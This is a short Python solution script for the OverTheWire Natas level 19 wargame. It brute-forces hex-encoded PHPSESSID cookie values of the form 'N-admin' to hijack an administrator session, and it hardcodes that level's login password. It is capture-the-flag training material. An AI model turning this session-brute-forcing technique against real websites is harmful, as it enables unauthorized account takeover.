#!/bin/python

import requests

url='http://natas19.natas.labs.overthewire.org/index.php'
max_id=640
auth=('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for i in range(max_id):
    cookie_str = str(i) + '-' + 'admin'
    cookie_hex = cookie_str.encode('utf-8').hex()
    cookie={'PHPSESSID':cookie_hex}
    response=requests.get(url, auth=auth, cookies=cookie)
    if 'regular user' not in response.text:
        print('Admin PHPSESSID: ' + str(i))
        print(response.text)
        break
